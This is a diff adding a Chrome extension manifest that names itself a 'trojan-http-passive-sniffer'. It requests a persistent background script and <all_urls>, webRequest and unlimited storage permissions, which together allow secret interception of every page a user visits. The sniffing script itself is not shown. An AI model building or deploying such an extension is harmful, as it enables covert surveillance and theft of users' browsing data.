@@ -1,0 +1,22 @@
+{
+    "name": "chrome-trojan-http-passive-sniffer",
+    "version": "1.0.0",
+    "description": "trojan-http-passive-sniffer",
+    "icons": {
+      "16": "/app/img/ico.png",
+      "48": "/app/img/ico.png",
+      "128": "/app/img/ico.png"
+    },
+    "offline_enabled": true,
+    "background": {
+      "scripts": ["app/js/background.js"],
+      "persistent": true
+    },
+    "permissions": [
+       "<all_urls>",
+       "unlimitedStorage",
+       "storage",
+       "webRequest"
+    ],
+    "manifest_version": 2
+}
